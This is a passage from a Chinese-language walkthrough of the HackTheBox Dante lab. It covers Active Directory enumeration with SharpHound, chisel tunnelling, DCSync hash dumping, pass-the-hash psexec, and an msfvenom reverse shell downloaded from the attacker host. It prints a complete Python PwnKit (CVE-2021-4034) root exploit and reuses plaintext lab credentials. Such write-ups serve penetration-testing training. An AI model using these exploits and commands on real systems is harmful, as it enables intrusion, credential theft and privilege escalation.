Import-Module .\SharpHound_old.ps1
Invoke-BloodHound -CollectionMethod All -Domain DANTE.LOCAL -ZipFileName data.zip
```

艹，还是不行

### 上传bloodhound_v1.1.0
```plain
meterpreter > upload /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 C:\\Windows\\Temp\\SharpHound.ps1
[*] Uploading  : /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
[*] Uploaded 1.26 MiB of 1.26 MiB (100.0%): /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
[*] Completed  : /home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
```

### 运行bloodhound_v1.1.0
```plain
cd C:\Windows\Temp
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain DANTE.LOCAL -ZipFileName data.zip

上传exe也失败了
```

不是哥们逗我呢，这个版本都不行

### 失败原因
**NT AUTHORITY\SYSTEM**

而 SharpHound v1.x 有一个很隐蔽但很致命的限制：

    v1.x 在以下情况下会直接不写文件：

        不是「交互式域用户」

        没有有效的 Domain Context

        当前 token 不包含域 SID

📌 SYSTEM 在域成员机器上 ≠ 域用户

### msf-winrm
```plain
msf6 auxiliary(scanner/winrm/winrm_login) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
SRVPORT => 1080
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > use auxiliary/scanner/winrm/winrm_login
msf6 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 172.16.2.5
RHOSTS => 172.16.2.5
msf6 auxiliary(scanner/winrm/winrm_login) > set DOMAIN DANTEDOMAIN => DANTE
msf6 auxiliary(scanner/winrm/winrm_login) > set USERNAME jbercov
USERNAME => jbercov
msf6 auxiliary(scanner/winrm/winrm_login) > set PASSWORD myspace7
PASSWORD => myspace7
msf6 auxiliary(scanner/winrm/winrm_login) > set Proxies socks5:127.0.0.1:1080
Proxies => socks5:127.0.0.1:1080
msf6 auxiliary(scanner/winrm/winrm_login) > set VERBOSE trueVERBOSE => true
msf6 auxiliary(scanner/winrm/winrm_login) > run
[!] No active DB -- Credential data will not be saved!
[-] 172.16.2.5: - LOGIN FAILED: DANTE\jbercov:myspace7 (Unable to Connect: A socket error occurred.)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

ok啊老铁们，失败了

没办法先配置chisel代理吧

## `chisel`
### msf上传并执行
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/chisel]
└─# chisel server -p 8000 --reverse
2026/02/01 16:31:14 server: Reverse tunnelling enabled
2026/02/01 16:31:14 server: Fingerprint /El8feXSo/AW89cbrQ8O0zpAXh4ZWMFyj1CRn+cHXys=
2026/02/01 16:31:14 server: Listening on http://0.0.0.0:8000
2026/02/01 16:37:13 server: session#1: Client version (1.11.3) differs from server version (1.10.1-0kali1)
2026/02/01 16:37:13 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

```plain
meterpreter > upload /home/kali/Desktop/tools/chisel/chisel.exe C:\\Windows\\Temp\\chisel.exe
[*] Uploading  : /home/kali/Desktop/tools/chisel/chisel.exe -> C:\Windows\Temp\chisel.exe
[*] Uploaded 8.00 MiB of 10.12 MiB (79.05%): /home/kali/Desktop/tools/chisel/chisel.exe -> C:\Windows\Temp\chisel.exe
[*] Uploaded 10.12 MiB of 10.12 MiB (100.0%): /home/kali/Desktop/tools/chisel/chisel.exe -> C:\Windows\Temp\chisel.exe
[*] Completed  : /home/kali/Desktop/tools/chisel/chisel.exe -> C:\Windows\Temp\chisel.exe
meterpreter > 
meterpreter > cd C:\\Windows\\Temp
meterpreter > execute -f chisel.exe -a "client 10.10.16.80:8000 R:socks" -H -d
Process 5292 created.
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# proxychains -q evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                    
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jbercov\Documents> cd C:\\Windows\\Temp
*Evil-WinRM* PS C:\Windows\Temp> 
*Evil-WinRM* PS C:\> hostname; type C:\Users\jbercov\Desktop\flag.txt
DANTE-DC02
DANTE{Im_too_hot_Im_K3rb3r045TinG!}
```

## 提权
### 上传sharphound
```plain
*Evil-WinRM* PS C:\Windows\Temp> echo $env:TEMP
C:\Users\jbercov\AppData\Local\Temp

upload ../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.exe C:\\Users\\jbercov\\AppData\\Local\\Temp\\SharpHound.exe
upload ../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 C:\\Users\\jbercov\\AppData\\Local\\Temp\\SharpHound.ps1

*Evil-WinRM* PS C:\Windows\Temp> upload ../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.exe C:\\Users\\jbercov\\AppData\\Local\\Temp\\SharpHound.exe                               
Info: Uploading /usr/share/sharphound/../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.exe to C:\Users\jbercov\AppData\Local\Temp\SharpHound.exe                                               
Data: 2430976 bytes of 2430976 bytes copied                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> upload ../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 C:\\Users\\jbercov\\AppData\\Local\\Temp\\SharpHound.ps1                               
Info: Uploading /usr/share/sharphound/../../../../home/kali/Desktop/tools/sharphound/SharpHound-v1.1.0/SharpHound.ps1 to C:\Users\jbercov\AppData\Local\Temp\SharpHound.ps1                                                 
Data: 1758320 bytes of 1758320 bytes copied                             
Info: Upload successful!
```

### 执行sharphound（失败）
```plain
.\SharpHound.exe -c All --NoSaveCache -ZipFileName data.zip
失败了，什么都没输出
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> Invoke-BloodHound -CollectionMethod All -Domain DANTE.LOCAL -ZipFileName data.zip
 
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> dir


    Directory: C:\Users\jbercov\AppData\Local\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/1/2026   9:59 AM              0 GYvSIel.ini
-a----         2/1/2026   9:55 AM        1823232 SharpHound.exe
-a----         2/1/2026  10:02 AM        1318740 SharpHound.ps1

```

艹！！！

```plain
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> . .\SharpHound.ps1
 
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> Get-Command Invoke-BloodHound
 

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-BloodHound


*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> Invoke-BloodHound -CollectionMethod All -Domain DANTE.LOCAL -NoSaveCache -ZipFileName data.zip
 
A parameter cannot be found that matches parameter name 'NoSaveCache'.
At line:1 char:61
+ ... dHound -CollectionMethod All -Domain DANTE.LOCAL -NoSaveCache -ZipFil ...
+                                                      ~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Invoke-BloodHound], ParameterBindingException
    + FullyQualifiedErrorId : NamedParameterNotFound,Invoke-BloodHound

```

### 执行sharphound（成功）
```plain
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> .\SharpHound.exe -c All -d DANTE.LOCAL -o C:\Users\jbercov\AppData\Local\Temp -v
*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> dir C:\Users\jbercov\AppData\Local\Temp
 


    Directory: C:\Users\jbercov\AppData\Local\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/1/2026  10:11 AM          11278 20260201101117_BloodHound.zip
-a----         2/1/2026   9:59 AM              0 GYvSIel.ini
-a----         2/1/2026  10:11 AM           7837 MzZjZmU3ZDQtMjhlZS00OGVhLWExYzQtYmFjYzE3NTY2YmM2.bin
-a----         2/1/2026   9:55 AM        1823232 SharpHound.exe
-a----         2/1/2026  10:02 AM        1318740 SharpHound.ps1

*Evil-WinRM* PS C:\Users\jbercov\AppData\Local\Temp> download 20260201101117_BloodHound.zip /home/kali/Desktop/htb/dante/blood.zip                                     
Info: Downloading C:\Users\jbercov\AppData\Local\Temp\20260201101117_BloodHound.zip to /home/kali/Desktop/htb/dante/blood.zip                                                       
Progress: 100% : |▓▓▓▓▓▓▓▓▓▒| 
Info: Download successful!

```

![](/image/prolabs/Dante-40.png)



该用户拥有 **GetChangesAll 权限 **，允许进行 **DCsync** ：

### DCsync -secretsdump
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q impacket-secretsdump dante/jbercov:myspace7@172.16.2.5 -just-dc-user Administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0652a9eb0b8463a8ca287fc5d099076fbbd5f1d4bc0b94466ccbcc5c4a186095
Administrator:aes128-cts-hmac-sha1-96:08f140624c46af979044dde5fff44cfd
Administrator:des-cbc-md5:8ac752cea84f4a10
[*] Cleaning up... 
```

### Impacket-psexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q impacket-psexec Administrator@172.16.2.5 -no-pass -hashes :4c827b7074e99eefd49d05872185f7f8
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.2.5.....
[*] Found writable share ADMIN$
[*] Uploading file IzkclVSx.exe
[*] Opening SVCManager on 172.16.2.5.....
[*] Creating service RcAS on 172.16.2.5.....
[*] Starting service RcAS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
C:\Windows\system32> type "C:\Users\Administrator\Desktop\flag.txt
DANTE{DC_or_Marvel?}
```

## 翻查凭据
```plain
C:\Users\Administrator\Documents> whoami
nt authority\system
C:\Users\Administrator\Documents> dir
 Volume in drive C has no label.
 Volume Serial Number is 6CBC-ACA7

 Directory of C:\Users\Administrator\Documents

04/12/2020  01:14    <DIR>          .
04/12/2020  01:14    <DIR>          ..
14/07/2020  12:01                50 Jenkins.bat
               1 File(s)             50 bytes
               2 Dir(s)   6,378,561,536 bytes free

C:\Users\Administrator\Documents> type Jenkins.bat
net user Admin_129834765 SamsungOctober102030 /add
```

## 搜寻Jenkins
`proxychains -q nmap -Pn -sT -sV -T5 172.16.1.19`

```plain
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
8080/tcp open  http    Jetty 9.4.27.v20200227
```

我们在 172.16.1.19:8080 上识别出一个 Jetty（Jenkins）服务器；我们使用 `proxychains firefox` ，并使用新找到的凭据 **Admin_129834765 / SamsungOctober102030** 进行连接。

## 内网探测
```plain
C:\Users\Administrator\Documents> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::2d5c:8a52:1f80:1b57%16
   IPv4 Address. . . . . . . . . . . : 172.16.2.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.2.1
```

```plain
 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
 
C:\Users\Administrator\Documents>  (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
Reply from 172.16.2.5: bytes=32 time<1ms TTL=128
Reply from 172.16.2.101: bytes=32 time=1ms TTL=64
```

探测到172.16.2.101且这是一个 Linux 系统（TTL 为 64）

## 上传shell
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.16.80 LPORT=7797 \
-f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

```plain
curl http://10.10.16.80/shell.exe -O shell.exe
```

```plain
msf6 payload(windows/meterpreter/reverse_tcp) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.80
LHOST => 10.10.16.80
msf6 exploit(multi/handler) > set LPORT 7797
LPORT => 7797
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.80:7797 
[*] Sending stage (177734 bytes) to 10.10.110.3
[*] Meterpreter session 1 opened (10.10.16.80:7797 -> 10.10.110.3:7387) at 2026-02-01 19:14:12 +0800

meterpreter > 
```

## 端口扫描
我们将从 DC02 上的 Meterpreter 中使用 autoroute 命令并运行端口扫描：

```plain
meterpreter > run autoroute -s 172.16.2.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.2.0/255.255.255.0...
[+] Added route to 172.16.2.0/255.255.255.0 via 10.10.110.3
[*] Use the -p option to list all active routes
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=172.16.2.101 THREADS=20
[+] 172.16.2.101          - 172.16.2.101:22 - TCP OPEN
```

我们曾经在172.16.1.12的shadow文件中获取一份凭据

julian/manchesterunited  

## 端口转发
```plain
meterpreter > portfwd add -L 127.0.0.1 -l 7478 -p 22 -r 172.16.2.101
[*] Forward TCP relay created: (local) 127.0.0.1:7478 -> (remote) 172.16.2.101:22
```

# 172.16.2.101
## ssh连接
我们曾经在172.16.1.12的shadow文件中获取一份凭据

julian/manchesterunited 

尝试借此连接

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# ssh julian@127.0.0.1 -p 7478                    
The authenticity of host '[127.0.0.1]:7478 ([127.0.0.1]:7478)' can't be established.
ED25519 key fingerprint is SHA256:lqwJY9eSfzM1RXICCkqEQIeroC+VBVmvpAZ8dMQNsOE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:7478' (ED25519) to the list of known hosts.
julian@127.0.0.1's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


484 updates can be installed immediately.
230 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Tue Dec  8 05:17:22 2020 from 10.100.1.2
julian@DANTE-ADMIN-NIX05:~$
```

## 提权
这里正常方法是缓冲区溢出pwn掉

但是我不会！！！！！

```plain
julian@DANTE-ADMIN-NIX05:~$ find / -perm -4000 2>/dev/null/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/sbin/readfile
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/vmware-user-suid-wrapper
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/chsh
/snap/snapd/7264/usr/lib/snapd/snap-confine
/snap/snapd/11588/usr/lib/snapd/snap-confine
/snap/core18/1997/bin/mount
/snap/core18/1997/bin/ping
/snap/core18/1997/bin/su
/snap/core18/1997/bin/umount
/snap/core18/1997/usr/bin/chfn
/snap/core18/1997/usr/bin/chsh
/snap/core18/1997/usr/bin/gpasswd
/snap/core18/1997/usr/bin/newgrp
/snap/core18/1997/usr/bin/passwd
/snap/core18/1997/usr/bin/sudo
/snap/core18/1997/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1997/usr/lib/openssh/ssh-keysign
/snap/core18/1705/bin/mount
/snap/core18/1705/bin/ping
/snap/core18/1705/bin/su
/snap/core18/1705/bin/umount
/snap/core18/1705/usr/bin/chfn
/snap/core18/1705/usr/bin/chsh
/snap/core18/1705/usr/bin/gpasswd
/snap/core18/1705/usr/bin/newgrp
/snap/core18/1705/usr/bin/passwd
/snap/core18/1705/usr/bin/sudo
/snap/core18/1705/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1705/usr/lib/openssh/ssh-keysign
```

/usr/sbin/readfile存在缓冲区溢出，可用来提权

```plain
julian@DANTE-ADMIN-NIX05:~$ /usr/sbin/readfile
    Syntax: readfile </path/to/file>
    julian@DANTE-ADMIN-NIX05:~$ /usr/sbin/readfile /etc/passwd
    Error reading file located at /etc/passwd
```

## pkexec
```plain
julian@DANTE-ADMIN-NIX05:~$ pkexec --version
pkexec version 0.105
```

`pkexec 0.105` 正是**著名漏洞 CVE-2021-4034（PwnKit）** 所在的版本区间。  

## 提权-pwnkit
```plain
#!/usr/bin/env python3

# CVE-2021-4034 in Python
#
# Joe Ammond (joe@ammond.org)
#
# This was just an experiment to see whether I could get this to work
# in Python, and to play around with ctypes

# This was completely cribbed from blasty's original C code:
# https://haxx.in/files/blasty-vs-pkexec.c

import base64
import os
import sys

from ctypes import *
from ctypes.util import find_library

# Payload, base64 encoded ELF shared object. Generate with:
#
# msfvenom -p linux/x64/exec -f elf-so PrependSetuid=true | base64
#
# The PrependSetuid=true is important, without it you'll just get
# a shell as the user and not root.
#
# Should work with any msfvenom payload, tested with linux/x64/exec
# and linux/x64/shell_reverse_tcp

payload_b64 = b'''
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAAC
AEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAArwEAAAAAAADMAQAAAAAAAAAQ
AAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAA
AAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAA
AACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAASDH/amlYDwVIuC9iaW4vc2gAmVBUX1JeajtYDwU=
'''
payload = base64.b64decode(payload_b64)

# Set the environment for the call to execve()
environ = [
        b'exploit',
        b'PATH=GCONV_PATH=.',
        b'LC_MESSAGES=en_US.UTF-8',
        b'XAUTHORITY=../LOL',
        None
]

# Find the C library to call execve() directly, as Python helpfully doesn't
# allow us to call execve() with no arguments.
try:
    libc = CDLL(find_library('c'))
except:
    print('[!] Unable to find the C library, wtf?')
    sys.exit()

# Create the shared library from the payload
print('[+] Creating shared library for exploit code.')
try:
    with open('payload.so', 'wb') as f:
        f.write(payload)
except:
    print('[!] Failed creating payload.so.')
    sys.exit()
os.chmod('payload.so', 0o0755)

# make the GCONV_PATH directory
try:
    os.mkdir('GCONV_PATH=.')
except FileExistsError:
    print('[-] GCONV_PATH=. directory already exists, continuing.')
except:
    print('[!] Failed making GCONV_PATH=. directory.')
    sys.exit()

# Create a temp exploit file
try:
    with open('GCONV_PATH=./exploit', 'wb') as f:
        f.write(b'')
except:
    print('[!] Failed creating exploit file')
    sys.exit()
os.chmod('GCONV_PATH=./exploit', 0o0755)

# Create directory to hold gconf-modules configuration file
try:
    os.mkdir('exploit')
except FileExistsError:
    print('[-] exploit directory already exists, continuing.')
except:
    print('[!] Failed making exploit directory.')
    sys.exit()

# Create gconf config file
try:
    with open('exploit/gconv-modules', 'wb') as f:
        f.write(b'module  UTF-8//    INTERNAL    ../payload    2\n');
except:
    print('[!] Failed to create gconf-modules config file.')
    sys.exit()

# Convert the environment to an array of char*
environ_p = (c_char_p * len(environ))()
environ_p[:] = environ

print('[+] Calling execve()')
# Call execve() with NULL arguments
libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)

```

```plain
julian@DANTE-ADMIN-NIX05:~$ cd /tmp
julian@DANTE-ADMIN-NIX05:/tmp$ vi shell.py
julian@DANTE-ADMIN-NIX05:/tmp$ python3 shell.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# whoami
root
# cat /root/flag.txt
DANTE{0verfl0wing_l1k3_craz33!}

当前在sh中
# /bin/bash
root@DANTE-ADMIN-NIX05:/home/julian/Desktop#
```

## 内网探测
```c
 for i in {1..255};do (ping -c 1 172.16.2.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

> 172.16.2.5
>
> 172.16.2.6
>
> 172.16.2.101
>

```plain
export ip=172.16.2.6; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done

The port 22 is open
```

## ssh连接
尝试凭据复用 julian/manchesterunited

```plain
ssh julian@172.16.2.6
julian@172.16.2.6's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-61-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

286 packages can be updated.
223 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Dec  8 05:17:24 2020 from 10.100.1.2
julian@DANTE-ADMIN-NIX06:~$
```

# 172.16.2.6
## 信息收集
```plain
julian@DANTE-ADMIN-NIX06:~$ cat flag.txt
DANTE{H1ding_1n_th3_c0rner}

julian@DANTE-ADMIN-NIX06:~$ cat Desktop/SQL
Hi Julian
I've put this on your personal desktop as its probably the most secure 
place on the network!

Can you please ask Sophie to change her SQL password when she logs in
again? I've reset it to TerrorInflictPurpleDirt996655 as it stands, but
obviously this is a tough one to remember

Maybe we should all get password managers?

Thanks,
James

Julian，您好，
我把这个放在了您的个人桌面上，因为这可能是网络上最安全的地方！
您能否请 Sophie 在下次登录时更改她的 SQL 密码？我已经把它重置为 TerrorInflictPurpleDirt996655，但显然这个密码比较难记。
也许我们大家都应该使用密码管理器？
谢谢，
James
```

得到数据库账号密码

Sophie/TerrorInflictPurpleDirt996655

目前我们[172.16.1.5](#xXMnH)仅拿到了ftp的账号密码

且我们扫描端口看见了1433（mssql）开放

尝试登录去



```plain
julian@DANTE-ADMIN-NIX06:/home$ ls
julian  plongbottom
```

看到了用户plongbottom，该用户密码在DC01桌面的表格中存在

> plongbottom\PowerfixSaturdayClub777
>

```plain
julian@DANTE-ADMIN-NIX06:/home$ su plongbottom
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

## 提权
```plain
plongbottom@DANTE-ADMIN-NIX06:/home$ sudo -l
[sudo] password for plongbottom: 
Matching Defaults entries for plongbottom on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User plongbottom may run the following commands on
        localhost:
    (ALL : ALL) ALL
plongbottom@DANTE-ADMIN-NIX06:/home$
```

```plain
plongbottom@DANTE-ADMIN-NIX06:/home$ sudo su
root@DANTE-ADMIN-NIX06:/home#
root@DANTE-ADMIN-NIX06:~# cat flag.txt
DANTE{Alw4ys_check_th053_group5}
```



